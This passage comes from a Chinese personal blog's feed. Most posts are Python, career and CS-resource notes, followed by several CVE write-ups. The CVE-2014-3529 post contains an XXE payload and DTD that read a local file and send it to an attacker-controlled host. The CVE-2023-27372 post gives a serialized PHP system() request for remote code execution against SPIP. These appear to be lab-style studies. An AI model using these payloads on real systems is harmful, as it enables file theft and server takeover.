class="comment"># 检查 my_dog 是否是 Animal 类的实例</span></span><br><span class="line">is_animal = <span class="built_in">isinstance</span>(my_dog, Animal)</span><br><span class="line"><span class="built_in">print</span>(is_animal)  <span class="comment"># 输出: True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查 my_dog 是否是 str 类型的实例</span></span><br><span class="line">is_str = <span class="built_in">isinstance</span>(my_dog, <span class="built_in">str</span>)</span><br><span class="line"><span class="built_in">print</span>(is_str)  <span class="comment"># 输出: False</span></span><br></pre></td></tr></table></figure><p>在这个例子中，<code>my_dog</code> 是 <code>Dog</code> 类的一个实例，而 <code>Dog</code> 继承自 <code>Animal</code> 类。因此，<code>isinstance(my_dog, Dog)</code> 和 <code>isinstance(my_dog, Animal)</code> 都返回 <code>True</code>，而 <code>isinstance(my_dog, str)</code> 返回 <code>False</code>，因为 <code>my_dog</code> 不是字符串类型的实例。</p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Code </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何理解python中的异步</title>
      <link href="/2024/11/13/2024-03-22-%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3python%E4%B8%AD%E7%9A%84%E5%BC%82%E6%AD%A5/"/>
      <url>/2024/11/13/2024-03-22-%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3python%E4%B8%AD%E7%9A%84%E5%BC%82%E6%AD%A5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="1-什么是异步"><a href="#1-什么是异步" class="headerlink" title="1. 什么是异步"></a>1. 什么是异步</h2><h3 id="阻塞"><a href="#阻塞" class="headerlink" title="阻塞"></a>阻塞</h3><pre><code>在等待上一个任务完成之前，下一个任务无法开始，这就是阻塞，我需要上一个程序的值或者释放资源，</code></pre><h3 id="非阻塞"><a href="#非阻塞" class="headerlink" title="非阻塞"></a>非阻塞</h3><pre><code>在等待上一个任务完成之前，下一个任务可以开始，这就是非阻塞，我可以干别的事情，</code></pre><h3 id="同步"><a href="#同步" class="headerlink" title="同步"></a>同步</h3><pre><code>不同程序单元为了完成某个任务，在执行过程中需靠某种通信方式以协调一致，称这些程序单元是同步执行的。</code></pre><h3 id="异步"><a href="#异步" class="headerlink" title="异步"></a>异步</h3><pre><code>为完成某个任务，不同程序单元之间过程中无需通信协调，也能完成任务的方式。</code></pre></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Code </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>社会中的软技能</title>
      <link href="/2024/11/13/2024-03-17-softskils/"/>
      <url>/2024/11/13/2024-03-17-softskils/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="社会中的软技能"><a href="#社会中的软技能" class="headerlink" title="社会中的软技能"></a>社会中的软技能</h1><ol><li><p>交流能力<br>交流能力是非常重要的，减少内耗，不要盲目自我消化，首先查询从互联网上。</p></li><li><p>解决问题的能力</p></li><li><p>认识别人的能力。</p></li></ol></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> career </category>
          
      </categories>
      
      
        <tags>
            
            <tag> skills </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django</title>
      <link href="/2024/11/13/2024-03-19-Django/"/>
      <url>/2024/11/13/2024-03-19-Django/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h3 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h3><h4 id="ModelFrom-数据库操作"><a href="#ModelFrom-数据库操作" class="headerlink" title="ModelFrom-数据库操作"></a>ModelFrom-数据库操作</h4><h4 id="Form-表单操作"><a href="#Form-表单操作" class="headerlink" title="Form 表单操作"></a>Form 表单操作</h4></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Django </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Some Books for CS</title>
      <link href="/2024/11/13/2024-03-05-some-books-for-cs/"/>
      <url>/2024/11/13/2024-03-05-some-books-for-cs/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="Some-Books-for-CS"><a href="#Some-Books-for-CS" class="headerlink" title="Some Books for CS"></a>Some Books for CS</h2><p>一些开源书籍，供大家学习使用。建议支持正版。</p><p><a href="https://github.com/lining808/CS-Ebook/raw/main/images/class.svg" title="Alt text" class="gallery-item"><img src="https://github.com/lining808/CS-Ebook/raw/main/images/class.svg" alt="Alt text"></a></p><p>链接：<a href="https://github.com/lining808/CS-Ebook">CS-Ebook</a></p><p><a href="#some-books-for-cs">Some Books for CS</a></p><h1 id="计算机基础"><a href="#计算机基础" class="headerlink" title="计算机基础"></a>计算机基础</h1><table><thead><tr><th>书名</th><th>语言</th><th>封面</th></tr></thead><tbody><tr><td>计算机组成原理</td><td>中文</td><td><a href="https://github.com/lining808/CS-Ebook/raw/main/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%A6%82%E8%AE%BA/%E5%A4%A7%E8%AF%9D%E8%AE%A1%E7%AE%97%E6%9C%BA%20%E5%8D%B71-3.jpg" class="gallery-item"><img src="https://github.com/lining808/CS-Ebook/raw/main/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%A6%82%E8%AE%BA/%E5%A4%A7%E8%AF%9D%E8%AE%A1%E7%AE%97%E6%9C%BA%20%E5%8D%B71-3.jpg"></a></td></tr></tbody></table></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> resource </category>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> books </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>八股文</title>
      <link href="/2024/11/13/2024-03-05-%E5%85%AB%E8%82%A1%E6%96%87/"/>
      <url>/2024/11/13/2024-03-05-%E5%85%AB%E8%82%A1%E6%96%87/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="开一期面试常见问题"><a href="#开一期面试常见问题" class="headerlink" title="开一期面试常见问题"></a>开一期面试常见问题</h1><h2 id="一、数据结构"><a href="#一、数据结构" class="headerlink" title="一、数据结构"></a>一、数据结构</h2><h2 id="二、算法"><a href="#二、算法" class="headerlink" title="二、算法"></a>二、算法</h2><h2 id="三、操作系统"><a href="#三、操作系统" class="headerlink" title="三、操作系统"></a>三、操作系统</h2><h2 id="四、计算机网络"><a href="#四、计算机网络" class="headerlink" title="四、计算机网络"></a>四、计算机网络</h2><h2 id="五、数据库"><a href="#五、数据库" class="headerlink" title="五、数据库"></a>五、数据库</h2><h2 id="六、编程语言"><a href="#六、编程语言" class="headerlink" title="六、编程语言"></a>六、编程语言</h2><h1 id="一、数据结构-1"><a href="#一、数据结构-1" class="headerlink" title="一、数据结构"></a>一、数据结构</h1><h2 id="1-数组"><a href="#1-数组" class="headerlink" title="1. 数组"></a>1. 数组</h2><h2 id="2-链表"><a href="#2-链表" class="headerlink" title="2. 链表"></a>2. 链表</h2><h2 id="3-栈"><a href="#3-栈" class="headerlink" title="3. 栈"></a>3. 栈</h2><h2 id="4-队列"><a href="#4-队列" class="headerlink" title="4. 队列"></a>4. 队列</h2><h2 id="5-树"><a href="#5-树" class="headerlink" title="5. 树"></a>5. 树</h2><h2 id="6-图"><a href="#6-图" class="headerlink" title="6. 图"></a>6. 图</h2><h2 id="7-堆"><a href="#7-堆" class="headerlink" title="7. 堆"></a>7. 堆</h2><h2 id="8-哈希表"><a href="#8-哈希表" class="headerlink" title="8. 哈希表"></a>8. 哈希表</h2><h1 id="二、算法-1"><a href="#二、算法-1" class="headerlink" title="二、算法"></a>二、算法</h1><h2 id="1-排序"><a href="#1-排序" class="headerlink" title="1. 排序"></a>1. 排序</h2><h2 id="2-查找"><a href="#2-查找" class="headerlink" title="2. 查找"></a>2. 查找</h2><h2 id="3-递归"><a href="#3-递归" class="headerlink" title="3. 递归"></a>3. 递归</h2><h2 id="4-动态规划"><a href="#4-动态规划" class="headerlink" title="4. 动态规划"></a>4. 动态规划</h2><h2 id="5-贪心"><a href="#5-贪心" class="headerlink" title="5. 贪心"></a>5. 贪心</h2><h2 id="6-回溯"><a href="#6-回溯" class="headerlink" title="6. 回溯"></a>6. 回溯</h2><h2 id="7-分治"><a href="#7-分治" class="headerlink" title="7. 分治"></a>7. 分治</h2><h2 id="8-搜索"><a href="#8-搜索" class="headerlink" title="8. 搜索"></a>8. 搜索</h2><h2 id="9-图论"><a href="#9-图论" class="headerlink" title="9. 图论"></a>9. 图论</h2><h2 id="10-字符串"><a href="#10-字符串" class="headerlink" title="10. 字符串"></a>10. 字符串</h2><h1 id="三、操作系统-1"><a href="#三、操作系统-1" class="headerlink" title="三、操作系统"></a>三、操作系统</h1><h2 id="1-进程"><a href="#1-进程" class="headerlink" title="1. 进程"></a>1. 进程</h2><h2 id="2-线程"><a href="#2-线程" class="headerlink" title="2. 线程"></a>2. 线程</h2><h2 id="3-进程间通信"><a href="#3-进程间通信" class="headerlink" title="3. 进程间通信"></a>3. 进程间通信</h2><h2 id="4-死锁"><a href="#4-死锁" class="headerlink" title="4. 死锁"></a>4. 死锁</h2><h2 id="5-内存管理"><a href="#5-内存管理" class="headerlink" title="5. 内存管理"></a>5. 内存管理</h2><h2 id="6-文件系统"><a href="#6-文件系统" class="headerlink" title="6. 文件系统"></a>6. 文件系统</h2><h2 id="7-I-O设备管理"><a href="#7-I-O设备管理" class="headerlink" title="7. I&#x2F;O设备管理"></a>7. I&#x2F;O设备管理</h2><h2 id="8-调度算法"><a href="#8-调度算法" class="headerlink" title="8. 调度算法"></a>8. 调度算法</h2><h1 id="四、计算机网络-1"><a href="#四、计算机网络-1" class="headerlink" title="四、计算机网络"></a>四、计算机网络</h1><h2 id="1-OSI七层模型"><a href="#1-OSI七层模型" class="headerlink" title="1. OSI七层模型"></a>1. OSI七层模型</h2><h2 id="2-TCP-IP协议族"><a href="#2-TCP-IP协议族" class="headerlink" title="2. TCP&#x2F;IP协议族"></a>2. TCP&#x2F;IP协议族</h2><h2 id="3-IP地址"><a href="#3-IP地址" class="headerlink" title="3. IP地址"></a>3. IP地址</h2><h2 id="4-ARP协议"><a href="#4-ARP协议" class="headerlink" title="4. ARP协议"></a>4. ARP协议</h2><h2 id="5-IP协议"><a href="#5-IP协议" class="headerlink" title="5. IP协议"></a>5. IP协议</h2><h2 id="6-TCP协议"><a href="#6-TCP协议" class="headerlink" title="6. TCP协议"></a>6. TCP协议</h2><h2 id="7-UDP协议"><a href="#7-UDP协议" class="headerlink" title="7. UDP协议"></a>7. UDP协议</h2><h2 id="8-HTTP协议"><a href="#8-HTTP协议" class="headerlink" title="8. HTTP协议"></a>8. HTTP协议</h2><h2 id="9-DNS协议"><a href="#9-DNS协议" class="headerlink" title="9. DNS协议"></a>9. DNS协议</h2><h2 id="10-网络安全"><a href="#10-网络安全" class="headerlink" title="10. 网络安全"></a>10. 网络安全</h2><h1 id="五、数据库-1"><a href="#五、数据库-1" class="headerlink" title="五、数据库"></a>五、数据库</h1><h2 id="1-数据库系统"><a href="#1-数据库系统" class="headerlink" title="1. 数据库系统"></a>1. 数据库系统</h2><h2 id="2-数据库设计"><a href="#2-数据库设计" class="headerlink" title="2. 数据库设计"></a>2. 数据库设计</h2><h2 id="3-数据库范式"><a href="#3-数据库范式" class="headerlink" title="3. 数据库范式"></a>3. 数据库范式</h2><h2 id="4-数据库索引"><a href="#4-数据库索引" class="headerlink" title="4. 数据库索引"></a>4. 数据库索引</h2><h2 id="5-事务"><a href="#5-事务" class="headerlink" title="5. 事务"></a>5. 事务</h2><h2 id="6-锁"><a href="#6-锁" class="headerlink" title="6. 锁"></a>6. 锁</h2><h2 id="7-ACID"><a href="#7-ACID" class="headerlink" title="7. ACID"></a>7. ACID</h2><h2 id="8-数据库优化"><a href="#8-数据库优化" class="headerlink" title="8. 数据库优化"></a>8. 数据库优化</h2><h2 id="9-数据库备份与恢复"><a href="#9-数据库备份与恢复" class="headerlink" title="9. 数据库备份与恢复"></a>9. 数据库备份与恢复</h2><h2 id="10-数据库安全"><a href="#10-数据库安全" class="headerlink" title="10. 数据库安全"></a>10. 数据库安全</h2><h1 id="六、编程语言-1"><a href="#六、编程语言-1" class="headerlink" title="六、编程语言"></a>六、编程语言</h1><h2 id="1-C-C"><a href="#1-C-C" class="headerlink" title="1. C&#x2F;C++"></a>1. C&#x2F;C++</h2><h2 id="2-Java"><a href="#2-Java" class="headerlink" title="2. Java"></a>2. Java</h2><h2 id="3-Python"><a href="#3-Python" class="headerlink" title="3. Python"></a>3. Python</h2><h2 id="4-Go"><a href="#4-Go" class="headerlink" title="4. Go"></a>4. Go</h2><h2 id="5-JavaScript"><a href="#5-JavaScript" class="headerlink" title="5. JavaScript"></a>5. JavaScript</h2><h2 id="6-Shell"><a href="#6-Shell" class="headerlink" title="6. Shell"></a>6. Shell</h2><h2 id="7-SQL"><a href="#7-SQL" class="headerlink" title="7. SQL"></a>7. SQL</h2><h2 id="8-HTML-CSS"><a href="#8-HTML-CSS" class="headerlink" title="8. HTML&#x2F;CSS"></a>8. HTML&#x2F;CSS</h2><h2 id="9-PHP"><a href="#9-PHP" class="headerlink" title="9. PHP"></a>9. PHP</h2><h2 id="10-Ruby"><a href="#10-Ruby" class="headerlink" title="10. Ruby"></a>10. Ruby</h2><h1 id="七、其他"><a href="#七、其他" class="headerlink" title="七、其他"></a>七、其他</h1><h2 id="1-设计模式"><a href="#1-设计模式" class="headerlink" title="1. 设计模式"></a>1. 设计模式</h2><h2 id="2-系统设计"><a href="#2-系统设计" class="headerlink" title="2. 系统设计"></a>2. 系统设计</h2><h2 id="3-项目管理"><a href="#3-项目管理" class="headerlink" title="3. 项目管理"></a>3. 项目管理</h2><h2 id="4-代码管理"><a href="#4-代码管理" class="headerlink" title="4. 代码管理"></a>4. 代码管理</h2><h2 id="5-软件测试"><a href="#5-软件测试" class="headerlink" title="5. 软件测试"></a>5. 软件测试</h2><h2 id="6-容器技术"><a href="#6-容器技术" class="headerlink" title="6. 容器技术"></a>6. 容器技术</h2><h2 id="7-微服务"><a href="#7-微服务" class="headerlink" title="7. 微服务"></a>7. 微服务</h2><h2 id="8-云计算"><a href="#8-云计算" class="headerlink" title="8. 云计算"></a>8. 云计算</h2><h2 id="9-大数据"><a href="#9-大数据" class="headerlink" title="9. 大数据"></a>9. 大数据</h2><h2 id="10-人工智能"><a href="#10-人工智能" class="headerlink" title="10. 人工智能"></a>10. 人工智能</h2><h2 id="11-区块链"><a href="#11-区块链" class="headerlink" title="11. 区块链"></a>11. 区块链</h2><h2 id="12-物联网"><a href="#12-物联网" class="headerlink" title="12. 物联网"></a>12. 物联网</h2><h2 id="13-安全"><a href="#13-安全" class="headerlink" title="13. 安全"></a>13. 安全</h2><h2 id="14-算法工程师"><a href="#14-算法工程师" class="headerlink" title="14. 算法工程师"></a>14. 算法工程师</h2><h2 id="15-数据分析"><a href="#15-数据分析" class="headerlink" title="15. 数据分析"></a>15. 数据分析</h2><h2 id="16-数据挖掘"><a href="#16-数据挖掘" class="headerlink" title="16. 数据挖掘"></a>16. 数据挖掘</h2><h2 id="17-机器学习"><a href="#17-机器学习" class="headerlink" title="17. 机器学习"></a>17. 机器学习</h2><h2 id="18-深度学习"><a href="#18-深度学习" class="headerlink" title="18. 深度学习"></a>18. 深度学习</h2><h2 id="19-自然语言处理"><a href="#19-自然语言处理" class="headerlink" title="19. 自然语言处理"></a>19. 自然语言处理</h2><h2 id="20-计算机视觉"><a href="#20-计算机视觉" class="headerlink" title="20. 计算机视觉"></a>20. 计算机视觉</h2><h2 id="21-语音识别"><a href="#21-语音识别" class="headerlink" title="21. 语音识别"></a>21. 语音识别</h2><h2 id="22-推荐系统"><a href="#22-推荐系统" class="headerlink" title="22. 推荐系统"></a>22. 推荐系统</h2><h2 id="23-搜索引擎"><a href="#23-搜索引擎" class="headerlink" title="23. 搜索引擎"></a>23. 搜索引擎</h2><h2 id="24-信息检索"><a href="#24-信息检索" class="headerlink" title="24. 信息检索"></a>24. 信息检索</h2><h2 id="25-信息抽取"><a href="#25-信息抽取" class="headerlink" title="25. 信息抽取"></a>25. 信息抽取</h2><h2 id="26-知识图谱"><a href="#26-知识图谱" class="headerlink" title="26. 知识图谱"></a>26. 知识图谱</h2><h2 id="27-语义网"><a href="#27-语义网" class="headerlink" title="27. 语义网"></a>27. 语义网</h2><h2 id="28-云原生"><a href="#28-云原生" class="headerlink" title="28. 云原生"></a>28. 云原生</h2><h2 id="29-DevOps"><a href="#29-DevOps" class="headerlink" title="29. DevOps"></a>29. DevOps</h2><h2 id="30-服务器运维"><a href="#30-服务器运维" class="headerlink" title="30. 服务器运维"></a>30. 服务器运维</h2><h1 id="八、面试技巧"><a href="#八、面试技巧" class="headerlink" title="八、面试技巧"></a>八、面试技巧</h1><h2 id="1-简历"><a href="#1-简历" class="headerlink" title="1. 简历"></a>1. 简历</h2><h2 id="2-面试流程"><a href="#2-面试流程" class="headerlink" title="2. 面试流程"></a>2. 面试流程</h2><h2 id="3-面试技巧"><a href="#3-面试技巧" class="headerlink" title="3. 面试技巧"></a>3. 面试技巧</h2><h2 id="4-面试题解答"><a href="#4-面试题解答" class="headerlink" title="4. 面试题解答"></a>4. 面试题解答</h2><h2 id="5-面试题总结"><a href="#5-面试题总结" class="headerlink" title="5. 面试题总结"></a>5. 面试题总结</h2><h2 id="6-面试题收集"><a href="#6-面试题收集" class="headerlink" title="6. 面试题收集"></a>6. 面试题收集</h2><h2 id="7-面试题整理"><a href="#7-面试题整理" class="headerlink" title="7. 面试题整理"></a>7. 面试题整理</h2><h2 id="8-面试题分类"><a href="#8-面试题分类" class="headerlink" title="8. 面试题分类"></a>8. 面试题分类</h2><h2 id="9-面试题答案"><a href="#9-面试题答案" class="headerlink" title="9. 面试题答案"></a>9. 面试题答案</h2><h2 id="10-面试题解析"><a href="#10-面试题解析" class="headerlink" title="10. 面试题解析"></a>10. 面试题解析</h2></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> resource </category>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Interview </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2022-24112</title>
      <link href="/2024/11/13/2024-03-04-CVE-2022-24112/"/>
      <url>/2024/11/13/2024-03-04-CVE-2022-24112/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="CVE-2022-24112"><a href="#CVE-2022-24112" class="headerlink" title="CVE-2022-24112"></a>CVE-2022-24112</h2><ol><li>描述</li></ol><p>Apache Apisix是美国阿帕奇（Apache）基金会的一个云原生的微服务API网关服务。该软件基于 OpenResty 和 etcd 来实现，具备动态路由和插件热加载，适合微服务体系下的 API 管理。 Apache APISIX中存在远程代码执行漏洞，该漏洞源于产品的batch-requests插件未对用户的批处理请求进行有效限制。攻击者可通过该漏洞绕过Admin API的IP限制，容易导致远程代码执行。</p><ol start="2"><li><p>利用</p><p> 通过批处理请求绕过IP限制，进而导致远程代码执行</p></li></ol></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Blogging </category>
          
          <category> CVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2022-30887</title>
      <link href="/2024/11/13/2024-03-02-CVE-2022-30887/"/>
      <url>/2024/11/13/2024-03-02-CVE-2022-30887/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="CVE-2022-30887"><a href="#CVE-2022-30887" class="headerlink" title="CVE-2022-30887"></a>CVE-2022-30887</h2><ol><li>描述</li></ol><p>多语言药房管理系统 (MPMS) 是用 PHP 和 MySQL 开发的, 该软件的主要目的是在药房和客户之间提供一套接口，客户是该软件的主要用户。该软件有助于为药房业务创建一个综合数据库，并根据到期、产品等各种参数提供各种报告。 该CMS中php_action&#x2F;editProductImage.php存在任意文件上传漏洞，进而导致任意代码执行</p><ol start="2"><li><p>利用</p><p> 主要是通过信息搜集找到用户名和密码<br> 然后去上传的地方上传webshell，文件上传没有做任何限制<br> <a href="https://img2.imgtp.com/2024/03/02/TDUCP6IS.png" title="1709358391366.png" class="gallery-item"><img src="https://img2.imgtp.com/2024/03/02/TDUCP6IS.png" alt="1709358391366.png"></a></p></li></ol></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Blogging </category>
          
          <category> CVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2014-3529</title>
      <link href="/2024/11/13/2024-03-03-CVE-2014-3529/"/>
      <url>/2024/11/13/2024-03-03-CVE-2014-3529/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="CVE-2014-3529"><a href="#CVE-2014-3529" class="headerlink" title="CVE-2014-3529"></a>CVE-2014-3529</h2><p>必须要公网IP,目标主机可以访问到你的机器给你发送数据</p><ol><li>描述</li></ol><p>Apache POI 3.10.1 之前的 OPC SAX 设置允许远程攻击者通过 OpenXML 文件读取任意文件，该文件包含与 XML 外部实体 (XXE) 问题相关的 XML 外部实体声明和实体引用。</p><p>2.<br><a href="/../assets/img/PixPin_2024-03-04_16-07-42.png" title="Alt text" class="gallery-item"><img src="/../assets/img/PixPin_2024-03-04_16-07-42.png" alt="Alt text"></a></p><p><a href="/../assets/img/PixPin_2024-03-04_16-09-49.png" class="gallery-item"><img src="/../assets/img/PixPin_2024-03-04_16-09-49.png"></a></p><ol start="3"><li>准备两个资源</li></ol><p><code>[Content_Types].xml</code> 目标端执行的文件，压缩成zip文件后修改后缀为.xlsx,进行上传</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- [Content_Types].xml --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [ <span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://your public ip/xxe.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%dtd; %send;]&gt;</span></span><br></pre></td></tr></table></figure><p><code>xxe.dtd</code> 用于<code>xml</code>里面执行的dtd文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- xxe.dtd --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">all</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://your public/%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%all;</span><br></pre></td></tr></table></figure><ol start="4"><li><p>执行<br><a href="/../assets/img/2024-3-4.png" title="Alt text" class="gallery-item"><img src="/../assets/img/2024-3-4.png" alt="Alt text"></a></p></li><li><p>可以返回命令</p></li></ol><p><a href="/../assets/img/PixPin_2024-03-04_16-43-45.png" class="gallery-item"><img src="/../assets/img/PixPin_2024-03-04_16-43-45.png"></a></p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Blogging </category>
          
          <category> CVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2023-27372</title>
      <link href="/2024/11/13/2024-03-01-CVE-2023-27372/"/>
      <url>/2024/11/13/2024-03-01-CVE-2023-27372/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="CVE-2023-27372"><a href="#CVE-2023-27372" class="headerlink" title="CVE-2023-27372"></a>CVE-2023-27372</h2><ol><li>描述</li></ol><p>SPIP Cms v4.2.1之前版本允许通过公共区域中的表单值远程执行代码，因为序列化处理不当。</p><ol start="2"><li>分析</li></ol><p>漏洞存在于<strong>密码重置功能</strong>中(漏洞点位<code>url：/spip.php?page=spip_pass</code>)，重置密码时 <code>protege_champ()</code>函数没有对序列化字符串进行过滤，从而触发命令执行漏洞。</p><h2 id="FoFa"><a href="#FoFa" class="headerlink" title="FoFa"></a>FoFa</h2><p><code>app=&quot;SPIP&quot;</code></p><h2 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h2><p> 注入点位于 输入处</p><p> <a href="/assets/img/Pasted%20image%2020240301200817.png" title="Alt text" class="gallery-item"><img src="/assets/img/Pasted%20image%2020240301200817.png" alt="Alt text"></a></p><p><code>args</code>参数在检验必须是生成的</p><p><code>oubli=s:22:&quot;&lt;?php system(&#39;dir&#39;);?&gt;&quot;</code></p><p><a href="/assets/img/Pasted%20image%2020240301200842.png" title="Alt text" class="gallery-item"><img src="/assets/img/Pasted%20image%2020240301200842.png" alt="Alt text"></a></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">page=spip_pass&amp;formulaire_action=oubli&amp;formulaire_action_args=FE2zn8bKCx%2FVvPGBZIy92xUMWka8Q0Q28cFkYIXxT6BHAyltGN%2FwrwHTdofC9Gp0cejs9ntYLv7I5cq%2F&amp;formulaire_action_sign=&amp;oubli=s:21:&quot;&lt;?php system(&#x27;ls&#x27;);?&gt;&quot;;&amp;nobot=</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>SPIP Cms v4.2.1之前版本允许通过公共区域中的表单值远程执行代码，因为序列化处理不当。<br>利用的话需要先登录，然后在密码重置处进行利用。<br>s:21:”<?php system('ls');?>“; 为序列化后的字符串<br>21与<code>&lt;?php system(&#39;ls&#39;);?&gt;</code>长度有关</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&quot;&lt;?php system(&#x27;cat /flag&#x27;);?&gt;&quot;</span></span><br><span 